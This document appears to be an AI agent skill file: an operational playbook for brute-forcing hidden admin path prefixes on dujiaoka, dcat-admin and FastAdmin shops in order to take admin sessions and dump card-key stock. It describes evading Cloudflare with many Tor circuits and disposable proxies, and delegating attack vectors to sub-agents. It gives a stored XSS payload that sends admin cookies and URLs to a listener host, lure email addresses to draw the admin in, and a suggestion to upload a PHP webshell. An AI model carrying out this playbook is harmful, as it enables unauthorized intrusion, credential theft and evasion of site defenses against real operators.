---
name: hidden-admin-prefix-oracle
description: "Use when hunting randomized admin path prefixes via oracles."
version: 1.0.0
tags: [pentest, admin-route, dcat, dujiaoka, cloudflare, path-oracle, carmis, prefix-brute]
---

# Hidden Admin Prefix Oracle

When the admin panel lives under a **random `ADMIN_ROUTE` / install-time path** (dcat-admin, dujiaoka, many Chinese Laravel shops) and the edge returns the same 403/404 for wrong paths, hunt the prefix with a **path oracle**, not with order/payment side quests unless those are the named core.

## Core objective gate (user preference)

For faka / dujiaoka / dcat targets, **core = admin prefix → backend session / carmis export**, not order lists.

- Order SN, email IDOR, captcha-gated order query, yipay sign crack, coupon/0-amount chains are **side paths** only when they can yield **carmis / admin session** without the prefix.
- User framing that rejects “orders” means: kill slow order-spray / SN-enum mainlines; keep only vectors that terminate on prefix, carmis dump, or admin auth.
- Do not report order-query progress as core progress.
- **Brute is the main job, but deep audit runs in parallel.** Run the quick-recon checklist (§1b) once — each item is a single request or grep, takes ~5 minutes total. If all return 0, the prefix is random and brute is the primary path. When the user says "继续深挖" or "继续深度挖掘审计", they want **parallel attack surfaces alongside brute** — not just a faster brute. Run §1b items you missed, then open parallel vectors: stored XSS via create-order (§7), tinymce upload timestamp analysis (§8), full-port + IPv6 scan, Telegram/GitHub/urlscan OSINT, sub-domain enumeration, and origin IP exploration. Delegate independent vectors to sub-agents so brute throughput is unaffected. Do NOT treat "继续深挖" as "just increase brute speed and wait".

## 1b. Quick-recon checklist (run once, ~5 min)

Each item is a single probe or grep. If all miss, the prefix is random — stop recon and focus on brute throughput.

1. **JS/sourcemap**: `GET /vendor/dcat-admin/dcat/js/dcat-app.js` + `.map` — grep for `/{word}/(auth|login|carmis|dashboard)` and `admin.*prefix`.
2. **robots.txt + sitemap.xml** (+ sub-sitemaps like `/page-sitemap.xml`): grep for non-blog/product paths.
3. **Inline scripts on `/`**: grep `<script>` blocks for path literals not matching known front-end routes.
4. **Session cookie name**: `title_session` → `APP_NAME=title` (not admin prefix — they are independent configs).
5. **`/install` status**: 302→home = install.lock exists (cannot re-install); 200 with form = open installer (jackpot — POST `do-install` with your own `admin_path`).
6. **`/do-install` POST via Tor**: even with install.lock, test whether CF blocks POST (it may not via Tor). If install.lock redirects, this is dead.
7. **CF beacon token** (`data-cf-beacon`): note for cross-site correlation but rarely yields prefix.
8. **Author pages** (`/authors/{slug}`): grep for admin links, social handles, emails.
9. **`/_ignition/health-check`**: if 200/403 (not 404), Ignition route exists but CF blocks POST — dead end.
10. **Origin IP** (crt.sh / SecurityTrails / Shodan cert search): if found, `Host: target` direct → usually 403 allowlist on CF-fronted hosts.
11. **GitHub/Google OSINT**: `"target.com" ".env" OR "ADMIN_ROUTE"` — almost never yields results for small shops.
12. **Vendor files**: `/vendor/composer/installed.json`, `/mix-manifest.json`, `/.env`, `/.git/HEAD`, backup zips — all 404 on a properly deployed site.

If items 1–12 all miss: prefix is random. Close recon, maximize brute throughput.

## 1. Build the oracle first

Prefer a path that is **behind the same admin middleware / nginx allowlist** as the panel:

| Stack | Oracle path shape | Miss | Hit |
|-------|-------------------|------|-----|
| dujiaoka / dcat-admin | `/{prefix}/carmis` | nginx 404 body (`nginx</center>`) or plain 404 | 302→login, Laravel/dcat cookie, or non-nginx HTML |
| dcat generic | `/{prefix}/dcat-api/render` | nginx 404 | 302→login or framework error (non-nginx) |
| dcat generic | `/{prefix}/goods` or `/{prefix}/orders` | nginx 404 | 302→login or framework error (non-nginx) |
| Laravel | `/{prefix}/login` or known resource | framework 404 shape | redirect + `Set-Cookie: laravel_session` |

Rules:

- Calibrate miss once on a garbage prefix (`/zzzz/carmis`) every cool window — if miss shape flips to 429/CF challenge, **stop the brute**, do not log false hits.
- Hit must be **not-nginx + not-SPA-fallback**. SPA sites return identical 200 HTML for every path; compare body hash / size to homepage before celebrating.
- **Identical SPA HTML — or an nginx `405 Not Allowed` — for every candidate means your prefix is wrong, not that the oracle is broken.** A gateway routes only a real prefix to the backend and drops everything else into a static/SPA location, where GET returns the index and POST answers `405` from nginx. That is the static location talking, never the app: stop guessing prefixes and read the client's own base instead — grep the SPA bundles for `baseURL` and `url:"…"`, or the mobile client's request interface, and probe *that* literal (it is frequently one segment deeper than the host root or than a prefix you were handed).
- **Re-validate a prefix from an earlier session before reusing it.** Deployments move it; `/<stale-prefix>/<module>/…` answers the SPA indefinitely while the live base sits one segment further in, and a stale note costs hours of probing a static location.
- Prefer **no redirects followed** (`allow_redirects=False`) so 302 Location is visible.

## 2. Dictionary order (cheap → expensive)

1. **Hot / brand / install leftovers** (admin, ht, gl, manage, dcat, product/author slugs, shop short codes) — small, parallel OK if CF green.
2. **3-char alnum** full space if install often uses short random paths.
3. **4-char alnum** with **resume state** (done set + unres set). Never restart from zero after a crash.
4. **Pronounceable / mixed 5–8** only after short spaces are thin; do not open full 6–8 alnum without a reason.
5. **Unres retry** after a cool window — CF 429s inflate unres; merge tags and re-probe gently.

Do **not** stack brand + mix56 + longmix + all4 at high concurrency. One slow mainline + one high-value short dict is enough.

**Coverage math — do not sum run counters.** Progress lives in a per-tag done-set per run, and those sets overlap heavily. Report coverage as `|union(all done-sets) ∩ candidates(wordlist)| / |candidates|`; counting the union without intersecting with the wordlist inflates it (53.7% vs a true 51.7% here, because non-4-char tokens from other dictionaries were included). Two consequences: keep every run's done-set so you can rebuild the union after a crash, and treat a dictionary that came back clean as *closed* — do not re-spray pinyin/brand/author/hot dictionaries once they are fully covered; the remaining time belongs to the one live space.

## 3. Cloudflare / WAF self-injury (hard pacing)

Path-oracle brute is pure edge noise. Wrong concurrency **self-kills the exit**:

- **Concurrency is an EGRESS problem, not a thread problem.** From a single IP, 8–16 threads on a CF-fronted shop → 429 / Access denied within minutes; 1–2 threads is the ceiling *for one egress IP*. Raising threads on one IP never helps — it only self-reds. To go fast you must add *distinct exit IPs* (see §3b).
- **Add a global token bucket, not more threads.** Gate every request through a shared rate limiter (`RPS_LIMIT`, token bucket on wall clock) so the offered rate is stable and tunable at runtime. Then push the limit up until the target starts emitting 5xx, and back off one notch. Raw rps ≠ progress: at ~50 rps on a weak shared origin, ~44% of requests came back 502 and had to be re-queued, so "50 rps" was actually slower than a clean 44 rps.
- On **any** oracle/home 429 or Access denied HTML: `kill -STOP` all brute PIDs → cool **60–120s** → probe home + garbage oracle until 200 + known miss shape → `kill -CONT`.
- **Disable auto-restart services** that relaunch high-thread brutes. A “fixed” unit that still says `ALL 16` undoes pacing and re-reds the IP. When thread counts or duplicate processes keep reappearing after you kill them, check `systemctl list-units --all | grep -i <tag>` for an `activating auto-restart` unit plus its `.timer` sibling. `systemctl disable --now` both, then **move the unit files out of `/etc/systemd/system/` and `systemctl daemon-reload`** — `mask` fails with "File already exists" while the unit file is still present.
- **A `kill -STOP`ped process ignores SIGTERM.** After a STOP-based cool-off, `kill -TERM` silently does nothing; either `kill -CONT` first or go straight to `kill -9`. Confirm with `ps -o pid,state` (`T` = stopped).
- Kill **duplicate** processes on the same wordlist (two ALL writers corrupt done-json and double RPS).
- Do not open extra recon sprays (multiseg probes, hot path lists) while the main brute is already redlining CF — pause brute, probe, resume.

DONE-json tip: concurrent writers can leave **invalid JSON mid-write**. Read progress with try/except; never assume the file is always parseable mid-run. Write the done-set atomically (temp file + `os.replace`) and salvage a corrupt file with a regex pass (`"([0-9a-z]{1,8})"`) instead of discarding the run.

## 3b. Multi-egress scaling (how to actually go fast)

CF rate-limits **per source IP** (~15–20 req/s per exit before 429). Total throughput is therefore (number of live exit IPs × per-exit allowance), capped by what your egress layer can carry. Measured on one weak VPS against a CF-fronted oracle:

| Egress | Effective rps | 429 rate |
|--------|---------------|----------|
| direct, 30 threads | 1.5 | throttled (timeouts, not 429) |
| direct, HTTP/2 multiplexed, 100 concurrent | 57.6 offered / ~5 useful | 90% |
| 1 Tor instance, unique SOCKS auth per worker | 48 | 0 |
| 6 Tor instances × 20 circuits, ~300 threads/engine | ~22 rps per engine, 44 total | 0 |

**Tor multi-exit recipe** (works when the host has no extra IPs and no IPv6):

1. Run several Tor instances, each with its own `SocksPort`, `ControlPort`, `DataDirectory`, `RunAsDaemon 1`, `ClientOnly 1`, plus `MaxClientCircuitsPending 512`, `CircuitBuildTimeout 20`, `LearnCircuitBuildTimeout 0`. Put the torrc somewhere `debian-tor` can read (e.g. `/etc/tor/`), **not** under `/root` — `su -s /bin/bash debian-tor -c "tor -f …"` fails with "Unable to open configuration file" otherwise, and the `[err]` line is easy to miss.
2. Distribute worker requests across instances by port. **Isolate circuits per worker with the SOCKS username**: `socks5h://<unique-user>:x@127.0.0.1:<port>` gives each worker its own circuit → its own exit IP. Reusing one username makes all workers share one exit and trips 429 immediately.
3. To raise raw rps without more IPs, multiplex many streams over few circuits (e.g. 120 circuits for ~900 workers) — but load per exit then exceeds the per-IP allowance and 429s return, so this is a tuning knob, not a free multiplier.
4. Circuit churn costs latency. Fresh circuits per request push per-request time from ~1.5s to ~15s; keep worker sessions warm and rotate on failure instead of per request.
5. Expect a per-host Tor ceiling (~50–70 rps here) regardless of instance count — beyond that, adding instances only splits the same pipe. Plan the ETA from the measured ceiling, not from thread count.

**Free proxy pools are minutes-scale consumables.** ~19% of freshly harvested public proxies pass the oracle right after validation, and nearly all are dead ~40 minutes later; a passively-collected "good" list is a graveyard by the time you use it. If you use them at all: test a proxy and spend it **immediately** on a small batch, then discard — never build a pool file and rely on it later, and never let a brute burn 500 threads on a stale pool (it reads as ~30 rps of pure error).

**Process architecture.** Keep ≤~600 request threads per Python process. Above ~1000 threads the GIL starves the main loop and the process stops printing progress while still looking alive — that looks like a hang, not a crash. Shard the wordlist across several ~300–600 thread processes instead, and raise `ulimit -n` (default 4096 is not enough for 1000+ threads × sockets — you get silent stalls): launch via `bash -c 'ulimit -n 65535; exec python3 …'`.

Full recipe — instance setup, endpoint verification, runner architecture, sharding, measured benchmarks, ops checklist: `references/multi-egress-brute-harness.md`. Copyable Tor instance config: `templates/torrc-instance.conf`.

## 4. Side surfaces that look like “admin” but are not the prefix

Use these only as **leak channels for the prefix**, not as substitutes for the oracle:

- **Chat / ticket widgets**: recovery-code endpoints leak codes for the **requesting** session only, and some refuse until that session has sent a message (`请先发送一条消息，再获取找回码`). The phone number you pass is a label, not a lookup key — the code is minted for whoever is asking, so you cannot mint a code for the admin's number and recover their session. Cross-session recover of another user’s chat ≠ admin prefix; treat the widget as a lure surface only. If the visitor UI uses `textContent` / hardened render, stored XSS will not fire in the guest widget — admin-side render is the only XSS bet, and a live admin replying in chat is a signal to keep the lure session warm, not a lead by itself.
- **`/api/user` 401 JSON**: Laravel default `auth:api` surface; proves API stack, does not reveal `ADMIN_ROUTE`.
- **Ignition / `_ignition/execute-solution`**: route may exist (`Allow: POST`) while CF/WAF **rewrites or drops POST into GET** → method spoof and CVE-style bodies fail. Treat as blocked edge, not “Ignition RCE open”.
- **Source maps / `dcat-app.js.map`**: download and grep; often no prefix hardcode.
- **`/do-install` / leftover install**: usually locked post-install; CSRF walls are normal.
- **Sibling domains / history IPs**: verify body fingerprint + TLS SAN before calling origin; RDP-only or unrelated shops are dead ends.
- **Origin behind nginx allowlist**: even when an origin IP's TLS SAN matches the target domain and historical DNS confirms it was used, the nginx on origin may allowlist only CF source IPs — returning 403 for all paths from any other source. `Host` header tricks, method override, and path traversal do not bypass this. Confirm by comparing the 403 body against the normal CF-fronted 403 (they differ in `Server` header and body structure). This is distinct from "wrong origin" and means "right origin, can't reach it."

## 5. On hit — immediate chain

1. Write prefix to a durable hits file and **STOP other brutes** (protect CF for the exploit window).
2. `/{p}/auth/login` — default/weak admin only as a **small** theme list after non-cred cells if policy allows; prefer session/XSS/export first when already authorized engagement expects dump.
3. dcat export: authenticated `carmis` grid export / `_export_=all` style dumps when the panel is open.
4. Persist cookies/tokens offline; do not keep hammering login after one lockout.

## 6. Progress reporting (what “progress” means)

When asked 进度:

- Lead with **core result**: prefix hit? carmis? admin session?
- Then live processes + **% / dequeued / hit / unres** per wordlist + CF state (green/red).
- Do not pad with order SN counts or payment sign crack status unless those produced carmis.

## Pitfalls

- **Any non-miss response is a *suspect*, never a hit.** A transient CF/origin 502 has the right shape (non-nginx body, no 404) and will be logged as a prefix hit if you classify inline — it was, twice. Classify as: `404` → **negative, always** (a real dcat prefix redirects to login, it does not 404); `5xx`/429/challenge marker → **retry, never a hit**; only 200/301/302/401/403/405/419 with a non-nginx body → suspect.
- **Verify a suspect through ≥2 independent paths before writing the hits file, and re-verify on every restart of the engine.** Persist the candidate, `allow_redirects=False` probe it direct + through two different exits, and probe the sibling paths (`/{p}`, `/{p}/`, `/{p}/auth/login`) against a control prefix — a real prefix behaves consistently across all of them. Automate it: a supervisor loop that checks the hits file, re-verifies, deletes the file and restarts the engine on a false positive, and restarts any dead engine. Without that loop a single fabricated 502 ends the whole campaign.
- **Never add a candidate to the done-set before its verdict is known.** Marking a suspect "done" and *then* trying to confirm it silently deletes the real prefix from the search space forever — and the earlier proxy-era runs did exactly that, so their done-set had to be treated as untrusted. Order is: send → classify → confirm → only then record.
- **Hostile transports fabricate plausible responses.** Dead/abusive proxies return their own 200/403/500 pages, and one truncated an nginx 404 body mid-string so the "nginx</center>" marker was missing and it scored as a hit. Cheap structural filters before believing anything from a proxy: require a `Server` header containing `nginx`/`cloudflare`, drop bodies under ~300 bytes with no redirect, and count invalid responses as errors rather than progress.
- **index.php/admin path tricks** — CF may return non-nginx 403 that is still not Laravel admin; confirm dcat fingerprints.
- **`/auth/login` is challenged for every prefix**, real or not. CF WAF pattern-matches the literal string `auth/login` in any URL path and returns 403 regardless of whether the prefix exists — confirmed by testing random garbage prefixes. Also matches `/api/auth/login`. Do not use `/{prefix}/auth/login` as an oracle — and do **not** read the 403 as "route exists, WAF-protected": that inference aims the whole campaign at a controller that may never have been configured. The same 403 lands on GET/PUT/OPTIONS and on a browser session holding clearance cookies, which is consistent with a URL-pattern rule and is evidence of nothing else. Use `/{prefix}/carmis`, `/{prefix}/dcat-api/render`, or `/{prefix}/goods` instead — these are not pattern-matched by CF WAF and give clean nginx-404 vs non-nginx differentiation.
- **`do-install` POST can bypass CF when sent via Tor** (CF's POST-rewrite-to-GET only applies to certain path patterns). But if `install.lock` exists (confirmed by GET `/install` → 302), the `InstallCheck` middleware redirects both GET and POST to `/` before the controller runs — the install vector is dead. Only worth trying on targets where GET `/install` returns 200 with the installer form.
- **Laravel session cookie name reveals `APP_NAME`, not `ADMIN_ROUTE_PREFIX`.** A cookie like `title_session` means `APP_NAME=title` in `.env`, but the admin prefix is set independently via `ADMIN_ROUTE_PREFIX`. Do not test the APP_NAME as a prefix candidate and waste time on that dead end.
- **systemd/cron revive** — after you lower threads, move the unit files out of `/etc/systemd/system/`, `daemon-reload`, and confirm with `ps` not just `systemctl status`.
- **Do not `ps | grep <marker> | kill` from the same shell command that contains the marker.** The pattern matches the invoking shell's own command line and kills your session mid-task (happened repeatedly, once even matching a `python -c` argument). Put the kill/restart sequence in a **script file** whose own cmdline is just the script path, and reference processes with a bracketed pattern (`[t]or_mux_brute`) that cannot match itself.
- **Keep the origin alive — it is the thing you need at the end.** Throttle to the rate that produces zero 5xx and sane page latency (<3s for `/`); a shared PHP host at ~50 rps returned 502 for its own front pages and 12s+ load times, which means the admin panel is unusable too when you finally find the prefix. Overloading the origin also increases false negatives (502s on the real prefix get retried instead of recognized). Calibrate by probing `/` and `/products` after each rate change — if response time exceeds 5s or 5xx appears, cut the rate immediately.
- **Order IDOR success ≠ core** — free `detail-order-sn` without completed `info` textarea is empty; SN=`Str::random(16)` is not enumerable.

## 7. Stored XSS via create-order (dujiaoka)

When brute is running and admin is known to be active (e.g. recent tinymce uploads), plant stored XSS payloads that fire when admin views orders in dcat-admin backend.

### Attack chain
1. **Find valid gid**: enumerate `gid=1..80` via `POST /create-order` (500=invalid, 302=valid). Use Tor rotation to avoid CF 429 — each gid gets a fresh circuit. Space requests ~1-2s apart.
2. **Inject XSS in `search_pwd` field**: this field has no format validation (unlike `email` which requires valid format). Payload example: `<img src=x onerror="new Image().src='https://LISTENER/hit?c='+document.cookie+'&u='+encodeURIComponent(location.href)">`
3. **Also inject via `other_ipt_*` fields**: custom input fields defined per-product; no sanitization.
4. **The `location.href` in the callback leaks the admin prefix** — the admin views orders at `/{prefix}/order/{id}`, so the URL in the beacon directly reveals the prefix.
5. **Use social-engineering email addresses** to lure admin to click into the order detail: `<EMAIL-REDACTED>`, `<EMAIL-REDACTED>`.
6. **CSRF token required**: GET `/` first to grab `<meta name="csrf-token">` + `XSRF-TOKEN` cookie, then POST with `_token` + `X-XSRF-TOKEN` header.
7. **Listener must use correct domain/IP** that resolves from the admin's browser — use sslip.io pattern (`IP.sslip.io`) for self-signed HTTPS on a public IP.

### Pitfalls
- `email` field validates as email format — XSS payload won't pass. Use `search_pwd` or `other_ipt_*` instead.
- CF rate-limits POST to `/create-order` from a single IP — rotate Tor circuits per request.
- dcat-admin may HTML-escape `search_pwd` in the grid view but not in the detail modal — both `<img>` and `<svg>` payloads are worth trying.
- gid numbering is sparse — many IDs return 500 (deleted/disabled products). Valid gids cluster in ranges; once you find one, sweep nearby.

## 8. Tinymce upload timestamp analysis

Blog images uploaded via tinymce (`/uploads/tinymce/images/`) contain timestamps in their filenames that reveal when the admin was last active. Pattern: `{md5}{hex_or_decimal_timestamp}{random}.{ext}`. Parse the numeric portion to estimate upload dates. Recent activity (within days) means XSS payloads in orders are more likely to be viewed soon.

## 9. dcat-admin CVE-2026-11621 (file upload RCE)

dcat-admin ≤ 2.2.3-beta has an unauthenticated file upload at `/{prefix}/dcat-api/editor-md/upload`. Once the prefix is known (via brute or XSS beacon), immediately test this endpoint — it may allow writing a PHP webshell without authentication.

## 10. Origin port 888

Hostinger-hosted sites sometimes expose port 888 (nginx HTTP, possibly a hosting panel remnant). Probe with direct IP connection (no Host header or with the IP as Host). Usually only `.well-known/` returns 403 (ACME cert validation). Not typically exploitable but worth a quick scan — a management panel on 888 would bypass CF entirely.

## 11. FastAdmin (ThinkPHP) admin prefix hunting

FastAdmin uses a random admin prefix set at install time (stored in `application/extra/site.php` or `.env` as `admin_path`). Different oracle shape from dcat/Laravel:

### Fingerprinting FastAdmin
- **Asset directories**: `/assets/js/`, `/assets/css/`, `/assets/img/`, `/assets/libs/`, `/assets/addons/` return 403 (not 404).
- **Key files**: `/assets/js/require-backend.min.js` (~950KB), `/assets/css/fastadmin.css` (~143KB), `/assets/css/backend.min.css`, `/assets/js/backend.js` — all return 200 on FastAdmin.
- **Runtime directory**: `/runtime/` and `/runtime/session/` return 403 — confirms ThinkPHP stack.
- **`/index.php`** may 302 to `/api.html` or similar — confirms ThinkPHP routing.
- The admin JS (`require-backend.js`) references `Config.jsname`, `Config.actionname`, `Config.language` — these are set by the admin HTML page, not hardcoded in JS. Grepping the JS for the prefix is usually fruitless.

### Oracle shape

| Probe | Miss (wrong prefix) | Hit (correct prefix) |
|-------|---------------------|---------------------|
| `GET /{prefix}` | nginx 404 (146 bytes) | 302 → `/{prefix}/index/login` with `Set-Cookie: PHPSESSID` |
| `GET /{prefix}/` | nginx 404 | 302 → login or 200 with login HTML |
| `GET /{prefix}/index/login` | nginx 404 | 200 with FastAdmin login page (loads `/assets/js/require-backend.min.js`) |

**False-positive trap**: If the same domain serves a SPA frontend (UniApp/Vue), it may 302 to `/api.html` for all unknown paths on certain domains. Test the oracle on the **backend domain** (the one serving `/assets/`) not the frontend domain. Multiple domains may share the same backend — test each independently.

### Multi-domain backend detection
Chinese ThinkPHP apps often split across multiple domains:
- **Frontend**: UniApp SPA (e.g. `njubinasmd.icu`) — serves `/static/js/` and API at `/api/`
- **CDN/uploads**: image domain (e.g. `mjuowngkjwksg.shop`) — serves `/uploads/`, `/assets/`, `/runtime/` — **this is where the admin lives**
- **API mirror domains**: multiple domains share the same backend (same token works)

Probe `/assets/js/require-backend.min.js` on every discovered domain. The domain that returns 200 on FastAdmin assets is the one to brute-force the admin prefix on.

### ThinkPHP-specific recon items (add to §1b)
13. `/runtime/log/` — 403 means TP runtime exists; log filenames follow `{YYYYMM}/{DD}.log` pattern but may use custom format.
14. `/assets/js/require-backend.min.js` — 200 = FastAdmin confirmed; check all domains.
15. `/composer.json`, `/composer.lock` — may reveal ThinkPHP/FastAdmin version.
16. `/index.php?s=/admin` — TP5 route syntax; may reveal different 404 shape if admin route is registered.

Full Chinese scam platform (ThinkPHP+FastAdmin+UniApp) attack chain: `references/thinkphp-fastadmin-scam-platform.md`.

## 2026-10 情报批增量（大小写差异 oracle）

phpMyAdmin 实例：`/phpmyadmin/setup/index.php` → **301**；`/phpMyAdmin/setup/index.php` → **200**。
- 301 vs 200 = 该组件真实存在（301 为大小写规范化跳转）—— 确认已部署路径再深打。
- 泛化：对候选组件路径做大小写抖动（全小写/驼峰/首字母大写）；301/302/200 的差异形态就是存在性 oracle，也常是 WAF 前缀匹配的绕过口（@ethical_h4ck3r_ 2026-10 批）。
